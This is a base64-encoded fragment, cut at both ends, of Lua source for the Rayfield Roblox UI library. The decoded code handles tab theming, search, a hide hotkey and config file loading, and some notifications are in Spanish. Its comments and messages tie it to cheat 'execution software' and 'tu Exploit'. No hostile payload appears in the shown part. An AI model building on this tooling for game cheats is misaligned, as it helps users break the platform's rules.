3JvdW5kCgkJCQlTbGlkZXIuTWFpbi5VSVN0cm9rZS5Db2xvciA9IFNlbGVjdGVkVGhlbWUuU2xpZGVyU3Ryb2tlCgkJCQlTbGlkZXIuTWFpbi5Qcm9ncmVzcy5VSVN0cm9rZS5Db2xvciA9IFNlbGVjdGVkVGhlbWUuU2xpZGVyU3Ryb2tlCgkJCQlTbGlkZXIuTWFpbi5Qcm9ncmVzcy5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5TbGlkZXJQcm9ncmVzcwoJCQllbmQpCgoJCQlyZXR1cm4gU2xpZGVyU2V0dGluZ3MKCQllbmQKCgkJUmF5ZmllbGQuTWFpbjpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoJ0JhY2tncm91bmRDb2xvcjMnKTpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJVGFiQnV0dG9uLlVJU3Ryb2tlLkNvbG9yID0gU2VsZWN0ZWRUaGVtZS5UYWJTdHJva2UKCgkJCWlmIEVsZW1lbnRzLlVJUGFnZUxheW91dC5DdXJyZW50UGFnZSA9PSBUYWJQYWdlIHRoZW4KCQkJCVRhYkJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5UYWJCYWNrZ3JvdW5kU2VsZWN0ZWQKCQkJCVRhYkJ1dHRvbi5JbWFnZS5JbWFnZUNvbG9yMyA9IFNlbGVjdGVkVGhlbWUuU2VsZWN0ZWRUYWJUZXh0Q29sb3IKCQkJCVRhYkJ1dHRvbi5UaXRsZS5UZXh0Q29sb3IzID0gU2VsZWN0ZWRUaGVtZS5TZWxlY3RlZFRhYlRleHRDb2xvcgoJCQllbHNlCgkJCQlUYWJCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGFiQmFja2dyb3VuZAoJCQkJVGFiQnV0dG9uLkltYWdlLkltYWdlQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5UYWJUZXh0Q29sb3IKCQkJCVRhYkJ1dHRvbi5UaXRsZS5UZXh0Q29sb3IzID0gU2VsZWN0ZWRUaGVtZS5UYWJUZXh0Q29sb3IKCQkJZW5kCgkJZW5kKQoKCQlyZXR1cm4gVGFiCgllbmQKCglFbGVtZW50cy5WaXNpYmxlID0gdHJ1ZQoKCgl0YXNrLndhaXQoMS4xKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uSW5PdXQpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLCAzOTAsIDAsIDkwKX0pOlBsYXkoKQoJdGFzay53YWl0KDAuMykKCVR3ZWVuU2VydmljZTpDcmVhdGUoTG9hZGluZ0ZyYW1lLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuMiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShMb2FkaW5nRnJhbWUuU3VidGl0bGUsIFR3ZWVuSW5mby5uZXcoMC4yLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKExvYWRpbmdGcmFtZS5WZXJzaW9uLCBUd2VlbkluZm8ubmV3KDAuMiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJdGFzay53YWl0KDAuMSkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbiwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtTaXplID0gdXNlTW9iaWxlU2l6aW5nIGFuZCBVRGltMi5uZXcoMCwgNTAwLCAwLCAyNzUpIG9yIFVEaW0yLm5ldygwLCA1MDAsIDAsIDQ3NSl9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5TaGFkb3cuSW1hZ2UsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC42fSk6UGxheSgpCgoJVG9wYmFyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCglUb3BiYXIuRGl2aWRlci5TaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDEpCglUb3BiYXIuRGl2aWRlci5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50U3Ryb2tlCglUb3BiYXIuQ29ybmVyUmVwYWlyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCglUb3BiYXIuVGl0bGUuVGV4dFRyYW5zcGFyZW5jeSA9IDEKCVRvcGJhci5TZWFyY2guSW1hZ2VUcmFuc3BhcmVuY3kgPSAxCglpZiBUb3BiYXI6RmluZEZpcnN0Q2hpbGQoJ1NldHRpbmdzJykgdGhlbgoJCVRvcGJhci5TZXR0aW5ncy5JbWFnZVRyYW5zcGFyZW5jeSA9IDEKCWVuZAoJVG9wYmFyLkNoYW5nZVNpemUuSW1hZ2VUcmFuc3BhcmVuY3kgPSAxCglUb3BiYXIuSGlkZS5JbWFnZVRyYW5zcGFyZW5jeSA9IDEKCgoJdGFzay53YWl0KDAuNSkKCVRvcGJhci5WaXNpYmxlID0gdHJ1ZQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb3BiYXIsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKFRvcGJhci5Db3JuZXJSZXBhaXIsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgl0YXNrLndhaXQoMC4xKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb3BiYXIuRGl2aWRlciwgVHdlZW5JbmZvLm5ldygxLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMSl9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9wYmFyLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJdGFzay53YWl0KDAuMDUpCglUd2VlblNlcnZpY2U6Q3JlYXRlKFRvcGJhci5TZWFyY2gsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC44fSk6UGxheSgpCgl0YXNrLndhaXQoMC4wNSkKCWlmIFRvcGJhcjpGaW5kRmlyc3RDaGlsZCgnU2V0dGluZ3MnKSB0aGVuCgkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb3BiYXIuU2V0dGluZ3MsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC44fSk6UGxheSgpCgkJdGFzay53YWl0KDAuMDUpCgllbmQKCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9wYmFyLkNoYW5nZVNpemUsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC44fSk6UGxheSgpCgl0YXNrLndhaXQoMC4wNSkKCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9wYmFyLkhpZGUsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC44fSk6UGxheSgpCgl0YXNrLndhaXQoMC4zKQoKCWlmIGRyYWdCYXIgdGhlbgoJCVR3ZWVuU2VydmljZTpDcmVhdGUoZHJhZ0JhckNvc21ldGljLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC43fSk6UGxheSgpCgllbmQKCglmdW5jdGlvbiBXaW5kb3cuTW9kaWZ5VGhlbWUoTmV3VGhlbWUpCgkJbG9jYWwgc3VjY2VzcyA9IHBjYWxsKENoYW5nZVRoZW1lLCBOZXdUaGVtZSkKCQlpZiBub3Qgc3VjY2VzcyB0aGVuCgkJCVJheWZpZWxkTGlicmFyeTpOb3RpZnkoe1RpdGxlID0gJ1VuYWJsZSB0byBDaGFuZ2UgVGhlbWUnLCBDb250ZW50ID0gJ1dlIGFyZSB1bmFibGUgZmluZCBhIHRoZW1lIG9uIGZpbGUuJywgSW1hZ2UgPSA0NDAwNzA0Mjk5fSkKCQllbHNlCgkJCVJheWZpZWxkTGlicmFyeTpOb3RpZnkoe1RpdGxlID0gJ1RlbWEgQ2FtYmlhZG8nLCBDb250ZW50ID0gJ0VsIHRlbWEgc2UgY2FtYmlvIGNvcnJlY3RhbWVudGUgYSAnLi4odHlwZW9mKE5ld1RoZW1lKSA9PSAnc3RyaW5nJyBhbmQgTmV3VGhlbWUgb3IgJ0N1c3RvbSBUaGVtZScpLi4nLicsIEltYWdlID0gNDQ4MzM2Mjc0OH0pCgkJZW5kCgllbmQKCglsb2NhbCBzdWNjZXNzLCByZXN1bHQgPSBwY2FsbChmdW5jdGlvbigpCgkJY3JlYXRlU2V0dGluZ3MoV2luZG93KQoJZW5kKQoJCglpZiBub3Qgc3VjY2VzcyB0aGVuIHdhcm4oJ1JheWZpZWxkIGhhZCBhbiBpc3N1ZSBjcmVhdGluZyBzZXR0aW5ncy4nKSBlbmQKCQoJcmV0dXJuIFdpbmRvdwplbmQKCmxvY2FsIGZ1bmN0aW9uIHNldFZpc2liaWxpdHkodmlzaWJpbGl0eTogYm9vbGVhbiwgbm90aWZ5OiBib29sZWFuPykKCWlmIERlYm91bmNlIHRoZW4gcmV0dXJuIGVuZAoJaWYgdmlzaWJpbGl0eSB0aGVuCgkJSGlkZGVuID0gZmFsc2UKCQlVbmhpZGUoKQoJZWxzZQoJCUhpZGRlbiA9IHRydWUKCQlIaWRlKG5vdGlmeSkKCWVuZAplbmQKCmZ1bmN0aW9uIFJheWZpZWxkTGlicmFyeTpTZXRWaXNpYmlsaXR5KHZpc2liaWxpdHk6IGJvb2xlYW4pCglzZXRWaXNpYmlsaXR5KHZpc2liaWxpdHksIGZhbHNlKQplbmQKCmZ1bmN0aW9uIFJheWZpZWxkTGlicmFyeTpJc1Zpc2libGUoKTogYm9vbGVhbgoJcmV0dXJuIG5vdCBIaWRkZW4KZW5kCgpsb2NhbCBoaWRlSG90a2V5Q29ubmVjdGlvbiAtLSBIYXMgdG8gYmUgaW5pdGlhbGl6ZWQgaGVyZSBzaW5jZSB0aGUgY29ubmVjdGlvbiBpcyBtYWRlIGxhdGVyIGluIHRoZSBzY3JpcHQKZnVuY3Rpb24gUmF5ZmllbGRMaWJyYXJ5OkRlc3Ryb3koKQoJaGlkZUhvdGtleUNvbm5lY3Rpb246RGlzY29ubmVjdCgpCglSYXlmaWVsZDpEZXN0cm95KCkKZW5kCgpUb3BiYXIuQ2hhbmdlU2l6ZS5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCWlmIERlYm91bmNlIHRoZW4gcmV0dXJuIGVuZAoJaWYgTWluaW1pc2VkIHRoZW4KCQlNaW5pbWlzZWQgPSBmYWxzZQoJCU1heGltaXNlKCkKCWVsc2UKCQlNaW5pbWlzZWQgPSB0cnVlCgkJTWluaW1pc2UoKQoJZW5kCmVuZCkKCk1haW4uU2VhcmNoLklucHV0OkdldFByb3BlcnR5Q2hhbmdlZFNpZ25hbCgnVGV4dCcpOkNvbm5lY3QoZnVuY3Rpb24oKQoJaWYgI01haW4uU2VhcmNoLklucHV0LlRleHQgPiAwIHRoZW4KCQlpZiBub3QgRWxlbWVudHMuVUlQYWdlTGF5b3V0LkN1cnJlbnRQYWdlOkZpbmRGaXJzdENoaWxkKCdTZWFyY2hUaXRsZS1mc2Vmc2VmZXNmc2VmZXNmZXNmVGhhbmtzJykgdGhlbiAKCQkJbG9jYWwgc2VhcmNoVGl0bGUgPSBFbGVtZW50cy5UZW1wbGF0ZS5TZWN0aW9uVGl0bGU6Q2xvbmUoKQoJCQlzZWFyY2hUaXRsZS5QYXJlbnQgPSBFbGVtZW50cy5VSVBhZ2VMYXlvdXQuQ3VycmVudFBhZ2UKCQkJc2VhcmNoVGl0bGUuTmFtZSA9ICdTZWFyY2hUaXRsZS1mc2Vmc2VmZXNmc2VmZXNmZXNmVGhhbmtzJwoJCQlzZWFyY2hUaXRsZS5MYXlvdXRPcmRlciA9IC0xMDAKCQkJc2VhcmNoVGl0bGUuVGl0bGUuVGV4dCA9ICJSZXN1bHRzIGZyb20gJyIuLkVsZW1lbnRzLlVJUGFnZUxheW91dC5DdXJyZW50UGFnZS5OYW1lLi4iJyIKCQkJc2VhcmNoVGl0bGUuVmlzaWJsZSA9IHRydWUKCQllbmQKCWVsc2UKCQlsb2NhbCBzZWFyY2hUaXRsZSA9IEVsZW1lbnRzLlVJUGFnZUxheW91dC5DdXJyZW50UGFnZTpGaW5kRmlyc3RDaGlsZCgnU2VhcmNoVGl0bGUtZnNlZnNlZmVzZnNlZmVzZmVzZlRoYW5rcycpCgoJCWlmIHNlYXJjaFRpdGxlIHRoZW4KCQkJc2VhcmNoVGl0bGU6RGVzdHJveSgpCgkJZW5kCgllbmQKCglmb3IgXywgZWxlbWVudCBpbiBpcGFpcnMoRWxlbWVudHMuVUlQYWdlTGF5b3V0LkN1cnJlbnRQYWdlOkdldENoaWxkcmVuKCkpIGRvCgkJaWYgZWxlbWVudC5DbGFzc05hbWUgfj0gJ1VJTGlzdExheW91dCcgYW5kIGVsZW1lbnQuTmFtZSB+PSAnUGxhY2Vob2xkZXInIGFuZCBlbGVtZW50Lk5hbWUgfj0gJ1NlYXJjaFRpdGxlLWZzZWZzZWZlc2ZzZWZlc2Zlc2ZUaGFua3MnIHRoZW4KCQkJaWYgZWxlbWVudC5OYW1lID09ICdTZWN0aW9uVGl0bGUnIHRoZW4KCQkJCWlmICNNYWluLlNlYXJjaC5JbnB1dC5UZXh0ID09IDAgdGhlbgoJCQkJCWVsZW1lbnQuVmlzaWJsZSA9IHRydWUKCQkJCWVsc2UKCQkJCQllbGVtZW50LlZpc2libGUgPSBmYWxzZQoJCQkJZW5kCgkJCWVsc2UKCQkJCWlmIHN0cmluZy5sb3dlcihlbGVtZW50Lk5hbWUpOmZpbmQoc3RyaW5nLmxvd2VyKE1haW4uU2VhcmNoLklucHV0LlRleHQpLCAxLCB0cnVlKSB0aGVuCgkJCQkJZWxlbWVudC5WaXNpYmxlID0gdHJ1ZQoJCQkJZWxzZQoJCQkJCWVsZW1lbnQuVmlzaWJsZSA9IGZhbHNlCgkJCQllbmQKCQkJZW5kCgkJZW5kCgllbmQKZW5kKQoKTWFpbi5TZWFyY2guSW5wdXQuRm9jdXNMb3N0OkNvbm5lY3QoZnVuY3Rpb24oZW50ZXJQcmVzc2VkKQoJaWYgI01haW4uU2VhcmNoLklucHV0LlRleHQgPT0gMCBhbmQgc2VhcmNoT3BlbiB0aGVuCgkJdGFzay53YWl0KDAuMTIpCgkJY2xvc2VTZWFyY2goKQoJZW5kCmVuZCkKClRvcGJhci5TZWFyY2guTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCgl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQlpZiBzZWFyY2hPcGVuIHRoZW4KCQkJY2xvc2VTZWFyY2goKQoJCWVsc2UKCQkJb3BlblNlYXJjaCgpCgkJZW5kCgllbmQpCmVuZCkKCmlmIFRvcGJhcjpGaW5kRmlyc3RDaGlsZCgnU2V0dGluZ3MnKSB0aGVuCglUb3BiYXIuU2V0dGluZ3MuTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCgkJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJCWZvciBfLCBPdGhlclRhYkJ1dHRvbiBpbiBpcGFpcnMoVGFiTGlzdDpHZXRDaGlsZHJlbigpKSBkbwoJCQkJaWYgT3RoZXJUYWJCdXR0b24uTmFtZSB+PSAiVGVtcGxhdGUiIGFuZCBPdGhlclRhYkJ1dHRvbi5DbGFzc05hbWUgPT0gIkZyYW1lIiBhbmQgT3RoZXJUYWJCdXR0b24gfj0gVGFiQnV0dG9uIGFuZCBPdGhlclRhYkJ1dHRvbi5OYW1lIH49ICJQbGFjZWhvbGRlciIgdGhlbgoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoT3RoZXJUYWJCdXR0b24sIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlRhYkJhY2tncm91bmR9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKE90aGVyVGFiQnV0dG9uLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0Q29sb3IzID0gU2VsZWN0ZWRUaGVtZS5UYWJUZXh0Q29sb3J9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKE90aGVyVGFiQnV0dG9uLkltYWdlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZUNvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGFiVGV4dENvbG9yfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShPdGhlclRhYkJ1dHRvbiwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuN30pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoT3RoZXJUYWJCdXR0b24uVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwLjJ9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKE90aGVyVGFiQnV0dG9uLkltYWdlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDAuMn0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoT3RoZXJUYWJCdXR0b24uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDAuNX0pOlBsYXkoKQoJCQkJZW5kCgkJCWVuZAoKCQkJRWxlbWVudHMuVUlQYWdlTGF5b3V0Okp1bXBUbyhFbGVtZW50c1snUmF5ZmllbGQgU2V0dGluZ3MnXSkKCQllbmQpCgllbmQpCgplbmQKCgpUb3BiYXIuSGlkZS5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCXNldFZpc2liaWxpdHkoSGlkZGVuLCBub3QgdXNlTW9iaWxlU2l6aW5nKQplbmQpCgpoaWRlSG90a2V5Q29ubmVjdGlvbiA9IFVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBwcm9jZXNzZWQpCglpZiAoaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGVbc2V0dGluZ3NUYWJsZS5HZW5lcmFsLnJheWZpZWxkT3Blbi5WYWx1ZSBvciAnSyddIGFuZCBub3QgcHJvY2Vzc2VkKSB0aGVuCgkJaWYgRGVib3VuY2UgdGhlbiByZXR1cm4gZW5kCgkJaWYgSGlkZGVuIHRoZW4KCQkJSGlkZGVuID0gZmFsc2UKCQkJVW5oaWRlKCkKCQllbHNlCgkJCUhpZGRlbiA9IHRydWUKCQkJSGlkZSgpCgkJZW5kCgllbmQKZW5kKQoKaWYgTVByb21wdCB0aGVuCglNUHJvbXB0LkludGVyYWN0Lk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJCWlmIERlYm91bmNlIHRoZW4gcmV0dXJuIGVuZAoJCWlmIEhpZGRlbiB0aGVuCgkJCUhpZGRlbiA9IGZhbHNlCgkJCVVuaGlkZSgpCgkJZW5kCgllbmQpCmVuZAoKZm9yIF8sIFRvcGJhckJ1dHRvbiBpbiBpcGFpcnMoVG9wYmFyOkdldENoaWxkcmVuKCkpIGRvCglpZiBUb3BiYXJCdXR0b24uQ2xhc3NOYW1lID09ICJJbWFnZUJ1dHRvbiIgYW5kIFRvcGJhckJ1dHRvbi5OYW1lIH49ICdJY29uJyB0aGVuCgkJVG9wYmFyQnV0dG9uLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9wYmFyQnV0dG9uLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQllbmQpCgoJCVRvcGJhckJ1dHRvbi5Nb3VzZUxlYXZlOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvcGJhckJ1dHRvbiwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAwLjh9KTpQbGF5KCkKCQllbmQpCgllbmQKZW5kCgoKZnVuY3Rpb24gUmF5ZmllbGRMaWJyYXJ5OkxvYWRDb25maWd1cmF0aW9uKCkKCWxvY2FsIGNvbmZpZwoKCWlmIGRlYnVnWCB0aGVuCgkJd2FybignTG9hZGluZyBDb25maWd1cmF0aW9uJykKCWVuZAoKCWlmIHVzZVN0dWRpbyB0aGVuCgkJY29uZmlnID0gW1t7IlRvZ2dsZTFhZHdhd2QiOnRydWUsIkNvbG9yUGlja2VyMWF3ZCI6eyJCIjoyNTUsIkciOjI1NSwiUiI6MjU1fSwiU2xpZGVyMWRhd2QiOjEwMCwiQ29sb3JQaWNmc2Vma2VyMSI6eyJCIjoyNTUsIkciOjI1NSwiUiI6MjU1fSwiU2xpZGVmZWZzcjEiOjgwLCJkYXdkYXdkIjoiIiwiSW5wdXQxIjoiaGgiLCJLZXliaW5kMSI6IkIiLCJEcm9wZG93bjEiOlsiT2NlYW4iXX1dXQoJZW5kCgoJaWYgQ0VuYWJsZWQgdGhlbgoJCWxvY2FsIG5vdGlmaWVkCgkJbG9jYWwgbG9hZGVkCgoJCWxvY2FsIHN1Y2Nlc3MsIHJlc3VsdCA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJaWYgdXNlU3R1ZGlvIGFuZCBjb25maWcgdGhlbgoJCQkJbG9hZGVkID0gTG9hZENvbmZpZ3VyYXRpb24oY29uZmlnKQoJCQkJcmV0dXJuCgkJCWVuZAoKCQkJaWYgaXNmaWxlIHRoZW4gCgkJCQlpZiBpc2ZpbGUoQ29uZmlndXJhdGlvbkZvbGRlciAuLiAiLyIgLi4gQ0ZpbGVOYW1lIC4uIENvbmZpZ3VyYXRpb25FeHRlbnNpb24pIHRoZW4KCQkJCQlsb2FkZWQgPSBMb2FkQ29uZmlndXJhdGlvbihyZWFkZmlsZShDb25maWd1cmF0aW9uRm9sZGVyIC4uICIvIiAuLiBDRmlsZU5hbWUgLi4gQ29uZmlndXJhdGlvbkV4dGVuc2lvbikpCgkJCQllbmQKCQkJZWxzZQoJCQkJbm90aWZpZWQgPSB0cnVlCgkJCQlSYXlmaWVsZExpYnJhcnk6Tm90aWZ5KHtUaXRsZSA9ICJSYXlmaWVsZCBDb25maWd1cmF0aW9ucyIsIENvbnRlbnQgPSAiRXN0byB0aWVuZSBhY3RpdmEgbGEgY29uZmlndXJhY2lvbiBkZSBHdWFyZGFkbyBhdXRvbWF0aWNvLCBwb3NpYmxlbWVudGUgbm8gZnVuY2lvbmUgY29uIHR1IEV4cGxvaXQuIiwgSW1hZ2UgPSA0Mzg0NDAyOTkwfSkKCQkJZW5kCgkJZW5kKQoKCQlpZiBzdWNjZXNzIGFuZCBsb2FkZWQgYW5kIG5vdCBub3RpZmllZCB0aGVuCgkJCVJheWZpZWxkTGlicmFyeTpOb3RpZnkoe1RpdGxlID0gIlJheWZpZWxkIENvbmZpZ3VyYXRpb25zIiwgQ29udGVudCA9ICJUdSBjb25maWd1cmFjaW9uIHNlIGEgY2FyZ2FkbyBjb3JyZWN0YW1lbnRlIiwgSW1hZ2UgPSA0Mzg0NDAzNTMyfSkKCQllbHNlaWYgbm90IHN1Y2Nlc3MgYW5kIG5vdCBub3RpZmllZCB0aGVuCgkJCXdhcm4oJ1JheWZpZWxkIENvbmZpZ3VyYXRpb25zIEVycm9yIHwgJy4udG9zdHJpbmcocmVzdWx0KSkKCQkJUmF5ZmllbGRMaWJyYXJ5Ok5vdGlmeSh7VGl0bGUgPSAiUmF5ZmllbGQgQ29uZmlndXJhdGlvbnMiLCBDb250ZW50ID0gIlR1IGNvbmZpZ3VyYWNpb24gbm8gc2UgYSBwb2RpZG8gY2FyZ2FyIGNvcnJlY3RhbWVudGUiLCBJbWFnZSA9IDQzODQ0MDI5OTB9KQoJCWVuZAoJZW5kCgoJZ2xvYmFsTG9hZGVkID0gdHJ1ZQplbmQKCgoKaWYgdXNlU3R1ZGlvIHRoZW4KCS0tIHJ1biB3LyBzdHVkaW8KCS0tIEZlZWwgZnJlZSB0byBwbGFjZSB5b3VyIG93biBzY3JpcHQgaGVyZSB0byBzZWUgaG93IGl0J2Qgd29yayBpbiBSb2Jsb3ggU3R1ZGlvIGJlZm9yZSBydW5uaW5nIGl0IG9uIHlvdXIgZXhlY3V0aW9uIHNvZnR3YXJlLgoKCglsb2NhbCBXaW5kb3cgPSBSYXlmaWVsZExpYnJhcnk6Q3JlYXRlV2luZG93KHsKCQlOYW1lID0gIlJheWZpZWxkIEV4YW1wbGUgV2luZG93IiwKCQlMb2FkaW5nVGl0bGUgPSAiUmF5ZmllbGQgSW50ZXJmYWNlIFN1aXRlIiwKCQlUaGVtZSA9ICdEZWZhdWx0JywKCQlJY29uID0gMCwKCQlMb2FkaW5nU3VidGl0bGUgPSAiYnkgU2lyaXVzIiwKCQlDb25maWd1cmF0aW9uU2F2aW5nID0gewoJCQlFbmFibGVkID0gdHJ1ZSwKCQkJRm9sZGVyTmFtZSA9IG5pbCwgLS0gQ3JlYXRlIGEgY3VzdG9tIGZvbGRlciBmb3IgeW91ciBodWIvZ2FtZQoJCQlGaWxlTmFtZSA9ICJCaWcgSHViNTIiCgkJfSwKCQlEaXNjb3JkID0gewoJCQlFbmFibGVkID0gZmFsc2UsCgkJCUludml0ZSA9ICJub2ludml0ZWxpbmsiLCAtLSBUaGUgRGlzY29yZCBpbnZpdGUgY29kZSwgZG8gbm90IGluY2x1ZGUgZGlzY29yZC5nZy8uIEUuZy4gZGlzY29yZC5nZy9BQkNEIHdvdWxkIGJlIEFCQ0QKCQkJUmVtZW1iZXJKb2lucyA9IHRydWUgLS0gU2V0IHRoaXMgdG8gZmFsc2UgdG8gbWFrZSB0aGVtIGpvaW4gdGhlIGRpc2NvcmQgZXZlcnkgdGltZSB0aGV5IGxvYWQgaXQgdXAKCQl9LAoJCUtleVN5c3RlbSA9IGZhbHNlLCAtLSBTZXQgdGhpcyB0byB0cnVlIHRvIHVzZSBvdXIga2V5IHN5c3RlbQoJCUtleVNldHRpbmdzID0gewoJCQlUaXRsZSA9ICJVbnRpdGxlZCIsCgkJCVN1YnRpdGxlID0gIktleSBTeXN0ZW0iLAoJCQlOb3RlID0gIk5vIG1ldGhvZCBvZiBvYnRhaW5pbmcgdGhlIGtleSBpcyBwcm92aWRlZCIsCgkJCUZpbGVOYW1lID0gIktleSIsIC0tIEl0IGlzIHJlY29tbWVuZGVkIHRvIHVzZSBzb21ldGhpbmcgdW5pcXVlIGFzIG90aGVyIHNjcmlwdHMgdXNpbmcgUmF5ZmllbGQgbWF5IG92ZXJ3cml0ZSB5b3VyIGtleSBmaWxlCgkJCVNhdmVLZXkgPSB0cnVlLCAtLSBUaGUgdXNlcidzIGtleSB3aWxsIGJlIH